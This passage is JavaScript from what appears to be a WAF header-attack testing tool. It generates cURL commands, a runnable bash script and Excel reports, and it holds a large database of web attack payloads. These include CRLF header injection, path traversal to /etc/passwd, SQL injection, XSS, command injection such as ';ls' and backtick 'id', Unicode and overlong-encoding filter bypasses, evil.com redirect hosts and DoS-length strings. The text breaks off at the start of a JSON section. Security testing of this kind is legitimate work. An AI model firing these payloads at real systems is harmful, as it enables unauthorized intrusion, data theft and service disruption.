// Create cURL commands data
function createCurlCommandsData(tests, targetUrl, proxyUrl, requestMethod, curlFormat, additionalHeaders) {
    const data = [
        ['WAF Header Attack Test - cURL Commands', '', ''],
        ['', '', ''],
        ['Target URL:', targetUrl, ''],
        ['Proxy:', proxyUrl || 'None', ''],
        ['HTTP Method:', requestMethod, ''],
        ['cURL Format:', getCurlFormatDescription(curlFormat), ''],
        ['Total Tests:', tests.length.toString(), ''],
        ['', '', ''],
        ['Test #', 'Test Name', 'cURL Command']
    ];
    
    // Add test rows with full cURL commands
    tests.forEach(({ category, test }, index) => {
        const curlCommand = generateCurlCommand(test.payload, targetUrl, proxyUrl, requestMethod, curlFormat, additionalHeaders);
        
        data.push([
            (index + 1).toString(),
            `${category} - ${test.name}`,
            curlCommand
        ]);
    });
    
    return data;
}

// Create shell script data
function createShellScriptData(tests, targetUrl, proxyUrl, requestMethod, curlFormat, additionalHeaders) {
    // Generate shell script content
    let scriptContent = `#!/bin/bash
# WAF Header Attack Test Script
# Generated: ${new Date().toISOString()}
# Target: ${targetUrl}
# Total Tests: ${tests.length}

TARGET="${targetUrl}"
${proxyUrl ? `PROXY="${proxyUrl}"` : '# No proxy configured'}
LOGFILE="waf_test_$(date +%Y%m%d_%H%M%S).log"

echo "Starting WAF Header Attack Tests..." | tee $LOGFILE
echo "Target: $TARGET" | tee -a $LOGFILE
echo "===========================================" | tee -a $LOGFILE

`;

    // Add all tests
    tests.forEach(({ category, test }, index) => {
        const curlCommand = generateCurlCommand(test.payload, targetUrl, proxyUrl, requestMethod, curlFormat, additionalHeaders);
        
        scriptContent += `
# Test ${index + 1}: ${category} - ${test.name}
echo -e "\\n[TEST ${index + 1}] ${test.name}" | tee -a $LOGFILE
echo "[DESCRIPTION] ${test.description}" | tee -a $LOGFILE
echo "[SEVERITY] ${test.severity.toUpperCase()}" | tee -a $LOGFILE

${curlCommand} 2>&1 | tee -a $LOGFILE
echo "-------------------------------------------" | tee -a $LOGFILE
`;
    });
    
    // Add ending
    scriptContent += `
echo -e "\\nTesting complete. Results saved to: $LOGFILE"
echo "Total tests executed: ${tests.length}"
`;

    // Split the script into lines for the Excel sheet
    const scriptLines = scriptContent.split('\n');
    
    // Create data array
    const data = [
        ['WAF Header Attack Test - Shell Script', '', ''],
        ['', '', ''],
        ['Instructions:', 'Save this content as a .sh file, make it executable (chmod +x filename.sh), and run it from a terminal.', ''],
        ['', '', ''],
    ];
    
    // Add each line of the script
    scriptLines.forEach(line => {
        data.push([line, '', '']);
    });
    
    return data;
}

// Get cURL format description
function getCurlFormatDescription(format) {
    switch (format) {
        case 'basic': return 'Basic (no options)';
        case 'verbose': return 'Verbose (-v)';
        case 'insecure': return 'Ignore SSL (-k)';
        case 'full': return 'Full Options (-v -k)';
        default: return format;
    }
}

// Create recommendations data
function createRecommendationsData(tests) {
    // Count by category to find the most common attack vectors
    const categoryCounts = {};
    tests.forEach(({ category }) => {
        if (!categoryCounts[category]) {
            categoryCounts[category] = 0;
        }
        categoryCounts[category]++;
    });
    
    // Get top categories
    const topCategories = Object.entries(categoryCounts)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 5);
    
    // Create data
    const data = [
        ['Security Recommendations', '', '', ''],
        ['', '', '', ''],
        ['WAF Configuration Recommendations', '', '', ''],
        ['', '', '', ''],
    ];
    
    // General recommendations
    data.push(['1. WAF Rule Enhancements', '', '', '']);
    data.push(['Recommendation:', 'Implement specific rules to handle malformed HTTP headers', '', '']);
    data.push(['Priority:', 'High', '', '']);
    data.push(['Description:', 'Configure the WAF to detect and block malicious header manipulation attempts, particularly focusing on header injection, CRLF injection, and request smuggling.', '', '']);
    data.push(['', '', '', '']);
    
    data.push(['2. HTTP Protocol Enforcement', '', '', '']);
    data.push(['Recommendation:', 'Enforce strict HTTP protocol compliance', '', '']);
    data.push(['Priority:', 'High', '', '']);
    data.push(['Description:', 'Configure the WAF to enforce RFC-compliant HTTP headers and reject requests with malformed headers, invalid characters, or oversized values.', '', '']);
    data.push(['', '', '', '']);
    
    // Top category specific recommendations
    topCategories.forEach(([category, count], index) => {
        const recommendations = getCategoryRecommendations(category);
        
        data.push([`${index + 3}. ${category} Protection`, '', '', '']);
        data.push(['Recommendation:', recommendations.recommendation, '', '']);
        data.push(['Priority:', recommendations.priority, '', '']);
        data.push(['Description:', recommendations.description, '', '']);
        data.push(['', '', '', '']);
    });
    
    // Additional recommendations
    data.push(['Implementation Guidelines', '', '', '']);
    data.push(['', '', '', '']);
    data.push(['1. Testing Environment', 'Set up a staging environment to test WAF rule changes before deploying to production.', '', '']);
    data.push(['2. Logging and Monitoring', 'Implement comprehensive logging for WAF events to track blocked requests and potential evasion attempts.', '', '']);
    data.push(['3. Regular Updates', 'Keep the WAF updated with the latest security patches and rule sets.', '', '']);
    data.push(['4. Periodic Testing', 'Conduct regular security testing with updated attack patterns to ensure continued protection.', '', '']);
    
    return data;
}

// Get category-specific recommendations
function getCategoryRecommendations(category) {
    const recommendations = {
        'Low ASCII & Control Characters': {
            recommendation: 'Block or sanitize control characters in HTTP headers',
            priority: 'High',
            description: 'Configure the WAF to detect and block requests containing control characters, null bytes, and other low ASCII characters in headers.'
        },
        'HTTP Response Splitting': {
            recommendation: 'Implement CRLF injection protection',
            priority: 'Critical',
            description: 'Enable WAF rules specifically designed to detect and block CRLF sequences in HTTP headers to prevent response splitting attacks.'
        },
        'Request Smuggling': {
            recommendation: 'Standardize Content-Length and Transfer-Encoding handling',
            priority: 'Critical',
            description: 'Configure the WAF to enforce consistent processing of Content-Length and Transfer-Encoding headers to prevent request smuggling attacks.'
        },
        'SQL Injection': {
            recommendation: 'Implement SQL injection protection for headers',
            priority: 'Critical',
            description: 'Enable WAF rules to detect and block SQL injection patterns in HTTP headers, not just in query parameters and request bodies.'
        },
        'Command Injection': {
            recommendation: 'Block command injection patterns in headers',
            priority: 'Critical',
            description: 'Configure the WAF to detect and block common command injection patterns including shell metacharacters and command execution sequences in headers.'
        },
        'Path Traversal': {
            recommendation: 'Implement path traversal protection for headers',
            priority: 'High',
            description: 'Enable WAF rules to detect and block directory traversal sequences in HTTP headers.'
        },
        'Host Header Attacks': {
            recommendation: 'Implement strict Host header validation',
            priority: 'High',
            description: 'Configure the WAF to validate Host headers against a whitelist of allowed hostnames and block requests with malformed or unauthorized values.'
        },
        'Authentication Bypass': {
            recommendation: 'Implement strict authentication header validation',
            priority: 'Critical',
            description: 'Configure the WAF to validate authentication headers and tokens, blocking manipulation attempts and enforcing security requirements.'
        },
        'SSRF Attacks': {
            recommendation: 'Implement SSRF protection for headers',
            priority: 'High',
            description: 'Configure the WAF to detect and block SSRF attack patterns in headers, including internal IP addresses and localhost references.'
        },
        'Cache Poisoning': {
            recommendation: 'Implement cache control header validation',
            priority: 'High',
            description: 'Configure the WAF to validate and sanitize cache-related headers to prevent cache poisoning attacks.'
        },
        'XXE Injection': {
            recommendation: 'Implement XXE protection',
            priority: 'Critical',
            description: 'Configure the WAF to detect and block XXE attack patterns, particularly in Content-Type headers and XML processing directives.'
        },
        'Protocol Attacks': {
            recommendation: 'Enforce protocol compliance',
            priority: 'High',
            description: 'Configure the WAF to strictly enforce HTTP protocol compliance and block invalid or malformed protocol-related headers.'
        },
        'LDAP Injection': {
            recommendation: 'Implement LDAP injection protection for headers',
            priority: 'High',
            description: 'Configure the WAF to detect and block LDAP injection patterns in HTTP headers.'
        },
        'XPath Injection': {
            recommendation: 'Implement XPath injection protection',
            priority: 'High',
            description: 'Configure the WAF to detect and block XPath injection patterns in HTTP headers.'
        },
        'Business Logic': {
            recommendation: 'Implement business logic protection',
            priority: 'High',
            description: 'Configure the WAF to validate business-related headers against expected formats and values to prevent business logic attacks.'
        },
        'Encoding Bypass': {
            recommendation: 'Implement encoding bypass protection',
            priority: 'High',
            description: 'Configure the WAF to normalize and validate encoded content in headers to prevent encoding-based bypass techniques.'
        },
        'API Security': {
            recommendation: 'Implement API-specific header protections',
            priority: 'High',
            description: 'Configure the WAF with specific rules to protect API endpoints from header-based attacks and enforce proper API security headers.'
        },
        'Mobile App Headers': {
            recommendation: 'Implement mobile app header validation',
            priority: 'Medium',
            description: 'Configure the WAF to validate mobile-specific headers and block manipulation attempts that could bypass app-level security controls.'
        },
        'Cloud Services': {
            recommendation: 'Implement cloud service header protection',
            priority: 'High',
            description: 'Configure the WAF to detect and block cloud service metadata and credential access attempts via header manipulation.'
        },
        'IoT Headers': {
            recommendation: 'Implement IoT-specific header validation',
            priority: 'Medium',
            description: 'Configure the WAF to validate IoT device headers and block manipulation attempts that could compromise device security.'
        },
        'Blockchain Headers': {
            recommendation: 'Implement blockchain transaction header validation',
            priority: 'Medium',
            description: 'Configure the WAF to validate blockchain-related headers and block manipulation attempts that could compromise transaction integrity.'
        },
        'Container Security': {
            recommendation: 'Implement container security header validation',
            priority: 'High',
            description: 'Configure the WAF to detect and block container escape attempts and other container-related attacks via header manipulation.'
        },
        'Zero Trust Headers': {
            recommendation: 'Implement zero trust header validation',
            priority: 'High',
            description: 'Configure the WAF to validate zero trust authentication and authorization headers, blocking any manipulation attempts.'
        },
        'WAF Bypass': {
            recommendation: 'Implement WAF bypass protection',
            priority: 'Critical',
            description: 'Configure the WAF with specific rules to detect and block WAF bypass techniques, including header-based evasion methods.'
        },
        'Privilege Escalation': {
            recommendation: 'Implement privilege escalation protection',
            priority: 'Critical',
            description: 'Configure the WAF to detect and block privilege escalation attempts via header manipulation, particularly focusing on role and permission headers.'
        },
        'Data Exfiltration': {
            recommendation: 'Implement data exfiltration protection',
            priority: 'High',
            description: 'Configure the WAF to detect and block data exfiltration attempts via header manipulation, focusing on data export and download-related headers.'
        },
        'Monitoring Evasion': {
            recommendation: 'Implement monitoring evasion protection',
            priority: 'High',
            description: 'Configure the WAF to detect and block monitoring evasion attempts via header manipulation, ensuring all requests are properly logged and monitored.'
        }
    };
    
    // Default recommendation if category not found
    if (!recommendations[category]) {
        return {
            recommendation: 'Implement specific protections for this attack vector',
            priority: 'Medium',
            description: `Configure the WAF with specific rules to protect against ${category} attacks via header manipulation.`
        };
    }
    
    return recommendations[category];
}

// Apply worksheet styling
function applyWorksheetStyling(worksheet, sheetType, theme) {
    // Set column widths
    const columnWidths = {
        executiveSummary: [40, 30, 20, 20, 20, 20],
        detailedAnalysis: [25, 25, 40, 15, 40, 60],
        statistics: [30, 20, 20, 20],
        curlCommands: [15, 40, 100],
        shellScript: [100, 20, 20],
        recommendations: [30, 60, 20, 20]
    };
    
    if (columnWidths[sheetType]) {
        worksheet['!cols'] = columnWidths[sheetType].map(width => ({ wch: width }));
    }
}

// Show success message after generating report
function showWafSuccessMessage(filename) {
    // Create a success message element
    const messageEl = document.createElement('div');
    messageEl.className = 'waf-report-success-message';
    messageEl.innerHTML = `
        <div class="waf-report-success-content">
            <i class="fas fa-check-circle"></i>
            <span>Excel report generated: ${filename}</span>
            <button onclick="this.parentElement.parentElement.remove()"></button>
        </div>
    `;
    
    // Add to document
    document.body.appendChild(messageEl);
    
    // Auto remove after 5 seconds
    setTimeout(() => {
        if (messageEl.parentElement) {
            messageEl.remove();
        }
    }, 5000);
}

// Add to report history
function addToWafReportHistory(report) {
    // Add to report history array
    wafReportHistory.unshift(report);
    
    // Limit to 10 items
    if (wafReportHistory.length > 10) {
        wafReportHistory.pop();
    }
    
    // Update history tab
    updateWafReportHistory();
}

// Update the report history tab
function updateWafReportHistory() {
    const historyList = document.querySelector('.waf-report-history-list');
    const historyEmpty = document.querySelector('.waf-report-history-empty');
    
    if (wafReportHistory.length > 0) {
        historyList.style.display = 'flex';
        historyEmpty.style.display = 'none';
        
        historyList.innerHTML = wafReportHistory.map(report => `
            <div class="waf-history-item">
                <div class="waf-history-icon">
                    <i class="fas fa-file-excel"></i>
                </div>
                <div class="waf-history-details">
                    <h4>${report.title}</h4>
                    <p>${report.timestamp.toLocaleString()}  ${report.testCount} tests</p>
                </div>
                <div class="waf-history-actions">
                    <button onclick="regenerateWafReport('${report.filename}')">
                        <i class="fas fa-download"></i>
                    </button>
                </div>
            </div>
        `).join('');
    } else {
        historyList.style.display = 'none';
        historyEmpty.style.display = 'flex';
    }
}

// Simulate regenerating a report
function regenerateWafReport(filename) {
    // This is just a simulation as we can't actually regenerate the exact file
    alert(`The report "${filename}" would be regenerated and downloaded again in a production environment.`);
}

// Helper function to escape HTML
function escapeHtml(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.toString().replace(/[&<>"']/g, m => map[m]);
}

// Initialize the logo upload listener
document.addEventListener('DOMContentLoaded', function() {
    const logoUpload = document.getElementById('wafLogoUpload');
    if (logoUpload) {
        logoUpload.addEventListener('change', function(e) {
            const file = e.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = function(event) {
                    wafCompanyLogo = event.target.result;
                };
                reader.readAsDataURL(file);
            }
        });
    }
    
    // Add the initial header row
    addHeaderRow();
});
</script>

    <script>
       // Test database with properly formatted payloads
const testDatabase = {
    "Low ASCII & Control Characters": {
        icon: "fa-keyboard",
        tests: [
            {
                name: "Null Byte Injection",
                description: "Tests null byte (0x00) handling",
                payload: 'X-Test: value\\x00secret',
                severity: "critical"
            },
            {
                name: "CRLF Injection Basic",
                description: "Basic CRLF injection test",
                payload: 'X-Test: value\\r\\nSet-Cookie: admin=true',
                severity: "critical"
            },
            {
                name: "Line Feed Only",
                description: "Single LF character injection",
                payload: 'X-Test: value\\nLocation: evil.com',
                severity: "high"
            },
            {
                name: "Carriage Return Only",
                description: "Single CR character injection",
                payload: 'X-Test: value\\rSet-Cookie: evil=true',
                severity: "high"
            },
            {
                name: "Tab Character",
                description: "Horizontal tab injection",
                payload: 'X-Test: value\\tinjected',
                severity: "low"
            },
            {
                name: "Form Feed",
                description: "Form feed character (0x0C)",
                payload: 'X-Test: before\\x0Cafter',
                severity: "low"
            },
            {
                name: "Backspace",
                description: "Backspace character test",
                payload: 'X-Test: visible\\x08hidden',
                severity: "low"
            },
            {
                name: "Bell Character",
                description: "Bell/Alert character (0x07)",
                payload: 'X-Test: alert\\x07sound',
                severity: "low"
            },
            {
                name: "Escape Character",
                description: "ESC character (0x1B)",
                payload: 'X-Test: \\x1B[31mred\\x1B[0m',
                severity: "low"
            },
            {
                name: "Multiple Nulls",
                description: "Multiple null bytes",
                payload: 'X-Test: \\x00\\x00\\x00\\x00',
                severity: "high"
            },
            {
                name: "All Control Chars 00-0F",
                description: "Control characters 0x00 to 0x0F",
                payload: 'X-Test: \\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0A\\x0B\\x0C\\x0D\\x0E\\x0F',
                severity: "medium"
            },
            {
                name: "All Control Chars 10-1F",
                description: "Control characters 0x10 to 0x1F",
                payload: 'X-Test: \\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1A\\x1B\\x1C\\x1D\\x1E\\x1F',
                severity: "medium"
            },
            {
                name: "Vertical Tab",
                description: "Vertical tab character (0x0B)",
                payload: 'X-Test: before\\x0Bafter',
                severity: "low"
            },
            {
                name: "Shift In/Out",
                description: "SI/SO characters (0x0E/0x0F)",
                payload: 'X-Test: \\x0Eshift-in\\x0Fshift-out',
                severity: "low"
            },
            {
                name: "Device Control 1-4",
                description: "DC1-DC4 characters",
                payload: 'X-Test: \\x11\\x12\\x13\\x14',
                severity: "low"
            },
            {
                name: "Data Link Escape",
                description: "DLE character (0x10)",
                payload: 'X-Test: \\x10data-link-escape',
                severity: "low"
            },
            {
                name: "Negative Acknowledge",
                description: "NAK character (0x15)",
                payload: 'X-Test: \\x15negative',
                severity: "low"
            },
            {
                name: "Synchronous Idle",
                description: "SYN character (0x16)",
                payload: 'X-Test: \\x16synchronous',
                severity: "low"
            },
            {
                name: "End of Transmission Block",
                description: "ETB character (0x17)",
                payload: 'X-Test: \\x17end-block',
                severity: "low"
            },
            {
                name: "Cancel Character",
                description: "CAN character (0x18)",
                payload: 'X-Test: \\x18cancel',
                severity: "low"
            },
            {
                name: "End of Medium",
                description: "EM character (0x19)",
                payload: 'X-Test: \\x19end-medium',
                severity: "low"
            },
            {
                name: "Substitute Character",
                description: "SUB character (0x1A)",
                payload: 'X-Test: \\x1Asubstitute',
                severity: "low"
            },
            {
                name: "File Separator",
                description: "FS character (0x1C)",
                payload: 'X-Test: \\x1Cfile-sep',
                severity: "low"
            },
            {
                name: "Group Separator",
                description: "GS character (0x1D)",
                payload: 'X-Test: \\x1Dgroup-sep',
                severity: "low"
            },
            {
                name: "Record Separator",
                description: "RS character (0x1E)",
                payload: 'X-Test: \\x1Erecord-sep',
                severity: "low"
            },
            {
                name: "Unit Separator",
                description: "US character (0x1F)",
                payload: 'X-Test: \\x1Funit-sep',
                severity: "low"
            },
            {
                name: "Delete Character",
                description: "DEL character (0x7F)",
                payload: 'X-Test: \\x7Fdelete',
                severity: "low"
            },
            {
                name: "Extended ASCII 80-9F",
                description: "Control characters 0x80 to 0x9F",
                payload: 'X-Test: \\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8A\\x8B\\x8C\\x8D\\x8E\\x8F\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9A\\x9B\\x9C\\x9D\\x9E\\x9F',
                severity: "medium"
            },
            {
                name: "Mixed Control Sequences",
                description: "Various control char combinations",
                payload: 'X-Test: \\x00\\r\\n\\x00\\t\\x1B\\x7F',
                severity: "medium"
            },
            {
                name: "Null Byte in Middle",
                description: "Null byte splitting values",
                payload: 'X-Test: normal\\x00hidden\\x00value',
                severity: "high"
            }
        ]
    },













"URI & Parameters": {
  icon: "fa-link",
  /* 100 progressively tougher cases for paths, query-strings, fragments,
     scheme confusion, double-encoding, parser smuggling, and exotic Unicode. */
  tests: [
    /*   Basic Path & Query   */
    { name: "Root Slash",                       description: "GET /",                                                             payload: "/",                                           severity: "low" },
    { name: "Simple Query",                     description: "/search?q=test",                                                   payload: "/search?q=test",                             severity: "low" },
    { name: "Key Without Value",                description: "/foo?debug",                                                      payload: "/foo?debug",                                 severity: "low" },
    { name: "Duplicate Key",                    description: "id=1&id=2",                                                       payload: "/item?id=1&id=2",                            severity: "medium" },
    { name: "Fragment Only",                    description: "#top",                                                            payload: "/#top",                                      severity: "low" },

    /*   Encoding & Case Oddities   */
    { name: "Percent-Encoded Space",            description: "%20 injection",                                                   payload: "/search?q=foo%20bar",                        severity: "low" },
    { name: "Plus Encoded Space",               description: "+ as space",                                                      payload: "/search?q=foo+bar",                          severity: "low" },
    { name: "Mixed Case Percent",               description: "%2f vs %2F",                                                      payload: "/%2Fetc%2Fpasswd",                           severity: "medium" },
    { name: "Uppercase Hex",                    description: "%41 for A",                                                       payload: "/file/%41.txt",                              severity: "low" },
    { name: "Lowercase Hex",                    description: "%41 but lowercase",                                               payload: "/file/%41%6e%79",                            severity: "low" },

    /*   Path Traversal Variants   */
    { name: "../ Traversal",                    description: "Canonical traversal",                                             payload: "/../../etc/passwd",                          severity: "critical" },
    { name: "./ Traversal",                     description: "Prefix with ./",                                                  payload: "/./././etc/passwd",                          severity: "high" },
    { name: "Double Encoded ../",               description: "%252e%252e",                                                     payload: "/%252e%252e/%252e%252e/etc/passwd",          severity: "critical" },
    { name: "Mixed Encoded Traversal",          description: "%2e./",                                                          payload: "/%2e./%2e./etc/passwd",                      severity: "critical" },
    { name: "UTF-8 Overlong Slash",             description: "C0 AF for /",                                                     payload: "/%C0%AFetc/passwd",                          severity: "critical" },

    /*   Reserved Characters & RFC 3986 Tests   */
    { name: "Reserved Semicolon",               description: ";session=1",                                                      payload: "/profile;session=1",                         severity: "medium" },
    { name: "Pipe Character",                   description: "| in query",                                                      payload: "/cmd?cat|ls",                                severity: "medium" },
    { name: "Backtick",                         description: "` command injection",                                             payload: "/run?cmd=`id`",                              severity: "high" },
    { name: "Caret",                            description: "^ path",                                                          payload: "/file^name.txt",                             severity: "low" },
    { name: "Comma In Path",                    description: "/foo,bar",                                                        payload: "/foo,bar",                                   severity: "low" },

    /*   Query Parameter Pollution   */
    { name: "CPP Null Key",                     description: "&&foo",                                                           payload: "/test?&&foo=1",                              severity: "high" },
    { name: "Bracket Notation",                 description: "arr[]=1&arr[]=2",                                                 payload: "/api?arr[]=1&arr[]=2",                       severity: "medium" },
    { name: "Encoded Bracket",                  description: "arr%5B%5D",                                                      payload: "/api?arr%5B%5D=1",                           severity: "high" },
    { name: "PHP Globals",                      description: "?GLOBALS=x",                                                      payload: "/login?GLOBALS[user]=admin",                 severity: "critical" },
    { name: "Dot Notation",                     description: "a.b=1",                                                          payload: "/conf?a.b=1",                                severity: "medium" },

    /*   CRLF & Header Smuggling via URI   */
    { name: "CRLF After Path",                  description: "%0d%0aHeader: val",                                              payload: "/path%0d%0aX-Test:injected",                severity: "critical" },
    { name: "LF Only After Query",              description: "%0a",                                                            payload: "/status?ok=1%0aSet-Cookie:evil",            severity: "critical" },
    { name: "Encoded CRLF Twice",               description: "%250d%250a",                                                     payload: "/path%250d%250aHeader:evil",                severity: "critical" },
    { name: "Unicode LS U+2028",                description: "Line sep in query",                                              payload: "/foo?q=good\u2028evil",                     severity: "critical" },
    { name: "Unicode PS U+2029",                description: "Paragraph sep in path",                                          payload: "/bar\u2029hack",                             severity: "critical" },

    /*   Alternate Schemes & Protocol Confusion   */
    { name: "JavaScript Scheme",                description: "javascript:alert(1)",                                            payload: "javascript:alert(1)",                        severity: "high" },
    { name: "Data URI Base64",                  description: "data:text/html;base64,PHNjcmlwdD5...",                           payload: "data:text/html;base64,PHNjcmlwdD4=",         severity: "high" },
    { name: "File Scheme",                      description: "file:///etc/passwd",                                             payload: "file:///etc/passwd",                         severity: "high" },
    { name: "View-Source Scheme",               description: "view-source:https://site",                                       payload: "view-source:https://example.com",            severity: "medium" },
    { name: "WebDav Method",                    description: "dav://",                                                         payload: "dav://evil.com/resource",                   severity: "low" },

    /*   Unicode & IDN Homographs   */
    { name: "Cyrillic a In Host",               description: " (U+0430)pple.com",                                             payload: "http://a\u0430pple.com",                    severity: "high" },
    { name: "Greek o In Path",                  description: " (U+03BF)",                                                     payload: "/lgin",                                     severity: "high" },
    { name: "Fullwidth Slash",                  description: " U+FF0F",                                                      payload: "etcpasswd",                               severity: "critical" },
    { name: "Zero-Width Joiner",                description: "ZWJ inside path",                                                payload: "/ad\u200Dmin",                               severity: "high" },
    { name: "RTL Override",                     description: "RLO hide .exe",                                                  payload: "/pic\u202Ecod.exe",                          severity: "critical" },

    /*   Overlong UTF-8 & Invalid Seqs   */
    { name: "Overlong Slash C0 AF",             description: "Bypass ../ filters",                                             payload: "/%C0%AF%C0%AE%C0%AE/etc",                    severity: "critical" },
    { name: "CESU-8 Surrogate",                 description: "ED A0 80",                                                      payload: "/%EDA080",                                   severity: "high" },
    { name: "Lone 0x80 Byte",                   description: "Incomplete UTF-8",                                               payload: "/\x80",                                      severity: "critical" },
    { name: "Overlong Null",                    description: "C0 80",                                                         payload: "/%C0%80cmd",                                 severity: "critical" },
    { name: "Five-Byte UTF-8",                  description: "F8 88 80 80 80",                                                 payload: "/%F8%88%80%80%80",                           severity: "critical" },

    /*   Path Length & Repetition DoS   */
    { name: "10k 'A's Path",                    description: "Very long path",                                                 payload: "/" + "A".repeat(10000),                      severity: "critical" },
    { name: "1k Query Keys",                    description: "foo0=0&foo1=1...",                                               payload: "/bulk?" + Array.from({length:1000},(_,i)=>`foo${i}=${i}`).join("&"), severity: "critical" },
    { name: "Repeating ../ 500x",               description: "Traversal spam",                                                 payload: "/"+("../".repeat(500)),                      severity: "critical" },
    { name: "Deep Nested Path 256",             description: "/a/a/... 256 levels",                                           payload: "/" + "a/".repeat(256),                       severity: "high" },
    { name: "Huge Fragment 64k",                description: "# followed by 64k",                                             payload: "/page#" + "B".repeat(65535),                 severity: "high" },

    /*   Duplicate Delimiters & Confusion   */
    { name: "Double Question ?",                description: "/path??a=1",                                                     payload: "/path??a=1",                                 severity: "medium" },
    { name: "Multiple # Hashes",                description: "##fragment",                                                    payload: "/index.html##foo",                           severity: "medium" },
    { name: "Mixed ?& Order",                   description: "foo&?bar",                                                      payload: "/svc/foo&?bar",                              severity: "high" },
    { name: ";param Style",                     description: "Matrix params ;id=1",                                           payload: "/users;id=1",                                severity: "medium" },
    { name: "Encoded Question %3F",             description: "%3F in path",                                                   payload: "/profile%3Fdebug",                           severity: "medium" },

    /*   Host Header in Absolute URI   */
    { name: "Absolute URI With IP",             description: "http://127.0.0.1@evil.com/",                                    payload: "http://127.0.0.1@evil.com/",                 severity: "high" },
    { name: "User-Info Credentials",            description: "http://admin:pass@site",                                        payload: "http://admin:pass@example.com/",             severity: "high" },
    { name: "IPv6 + Port",                      description: "http://[::1]:80/",                                             payload: "http://[::1]:80/",                          severity: "medium" },
    { name: "Long Host Dots",                   description: "A...B",                                                        payload: "http://a............b.com/",                severity: "high" },
    { name: "Bad Schema hTtP",                  description: "Mixed case scheme",                                             payload: "hTtP://evil.com",                            severity: "low" },

    /*   Parameter Value Exploits   */
    { name: "SQL ' OR 1=1",                     description: "' OR 1=1",                                                      payload: "/login?user=admin' OR 1=1--",                severity: "high" },
    { name: "XSS <script>",                     description: "<script>",                                                      payload: "/search?q=<script>alert(1)</ script>",        severity: "high" },
    { name: "Command Injection ;ls",            description: ";ls",                                                           payload: "/ping?host=1.1.1.1;ls",                      severity: "high" },
    { name: "LDAP Injection *()",               description: "*(|(user=*",                                                   payload: "/auth?filter=*(|(user=*",                   severity: "high" },
    { name: "Path Injection %00",               description: "Null byte to truncate",                                         payload: "/img?file=avatar.png%00.jpg",                severity: "critical" },

    /*   Mixed Encodings & Double Decoding   */
    { name: "Raw + Encoded XSS",                description: "<sc%72ipt>",                                                    payload: "/?q=%3Csc%72ipt%3Ealert(1)%3C/ script%3E",    severity: "high" },
    { name: "UTF-16 Encoded Query",             description: "%uXXXX style",                                                  payload: "/s?x=%u003Cimg%20src=x%20o nerror=1%3E",      severity: "high" },
    { name: "Mixed %25 + Enc",                  description: "Double %25 encoding",                                           payload: "/?redir=%25253C script%25253E",              severity: "critical" },
    { name: "Triple Decoding",                  description: "%%32%65",                                                      payload: "/%25%2532%2565",                             severity: "critical" },
    { name: "ModSecurity Evasion",              description: "%2e%2e%2f but split",                                          payload: "/%2e%2e/%2fetc/passwd",                      severity: "critical" },

    /*   HTTP Verb & Path Merge   */
    { name: "POST %2F GET Confusion",           description: "GET /%2F POST trick",                                          payload: "/%2Fadmin",                                 severity: "high" },
    { name: "OPTIONS *",                        description: "Asterisk form",                                                payload: "*",                                         severity: "medium" },
    { name: "TRACE Method",                     description: "TRACE /",                                                      payload: "TRACE / HTTP/1.1",                          severity: "high" },
    { name: "CONNECT Host:80",                  description: "CONNECT tunneling",                                            payload: "CONNECT example.com:80 HTTP/1.1",           severity: "critical" },
    { name: "Verb Mismatch",                    description: "GET // POST payload",                                          payload: "//admin",                                   severity: "high" },

    /*   Alternate Encodings (UTF-7, IDNA)   */
    { name: "UTF-7 +ADw-script",                description: "+ADw-script+AD4-",                                              payload: "/?q=+ADw-script+AD4-alert(1)",              severity: "critical" },
    { name: "Punycode xn--pple-43d",            description: "IDN homograph",                                                payload: "http://xn--pple-43d.com",                   severity: "high" },
    { name: "Mixed Punycode + Unicode",         description: "xn-- and raw homoglyph",                                       payload: "http://xn--e1awd7f.com/%D0%B0dmin",         severity: "high" },
    { name: "IDNA2008 Emoji Domain",            description: "xn--qei .ws",                                                  payload: "http://xn--qei.ws",                         severity: "medium" },
    { name: "RTL In Domain Label",              description: "abc\u202Edef.com",                                             payload: "http://abc\u202Edef.com",                   severity: "critical" },

    /*   Bypass Technique Combos   */
    { name: "Traversal + Null + CRLF",          description: "../%00\r\nHeader:",                                            payload: "/../etc/passwd%00\r\nFoo:bar",              severity: "critical" },
    { name: "Encoded Path + XSS Query",         description: "/%3Cimg%3E?x=%3Cimg%3E",                                      payload: "/%3Cimg%3E?x=%253C img%253E",                severity: "high" },
    { name: "Long Query + Overlong UTF-8",      description: "1k 'a' + C0 AF",                                               payload: "/search?" + "a".repeat(1000) + "%C0%AF",    severity: "critical" },
    { name: "Chunked Path Segments",            description: "//%2e/%2e//",                                                  payload: "//%2e/%2e//",                               severity: "high" },
    { name: "Obfuscated Traversal w/ Tabs",     description: "%09..%09/",                                                    payload: "/%09..%09/etc/passwd",                      severity: "critical" },

    /*   DoS / Parser Edge   */
    { name: "Nested Encoded %25 4x",            description: "%25%2525...",                                                  payload: "/%25%2525%252525%25252525",                 severity: "critical" },
    { name: "1000 '?' Marks",                   description: "Split param confusion",                                        payload: "/path" + "?".repeat(1000) + "a=1",          severity: "critical" },
    { name: "Encoded 0xFF Bytes",              description: "%FF spam",                                                      payload: "/%FF%FF%FF",                                severity: "critical" },
    { name: "Max IPv4 Decimal",                 description: "4294967295",                                                  payload: "http://4294967295/",                        severity: "medium" },
    { name: "Dotless Decimal IP",               description: "3232235521",                                                  payload: "http://3232235521/admin",                   severity: "high" },

    /*   Final Exotic Mixes   */
    { name: "Emoji Path ",                    description: "//launch",                                                   payload: "//launch",                                severity: "low" },
    { name: "Bidi + Emoji ",                  description: "rtl + ",                                                     payload: "/\u202E.txt",                              severity: "high" },
    { name: "ZWSP Query Break",                description: "q=\u200Badmin",                                                 payload: "/?q=\u200Badmin",                           severity: "high" },
    { name: "Private-Use Char Path",           description: "/\uE000secret",                                                payload: "/\uE000secret",                             severity: "medium" },
    { name: "Non-Character FFFF",              description: "U+FFFF",                                                        payload: "/\uFFFFhack",                               severity: "high" }
    /* 100 tests total */
  ]
},















"JSON Parsing": {
  icon: "fa-code",
  /* 100 diverse cases, escalating from trivial syntax quirks to extreme,
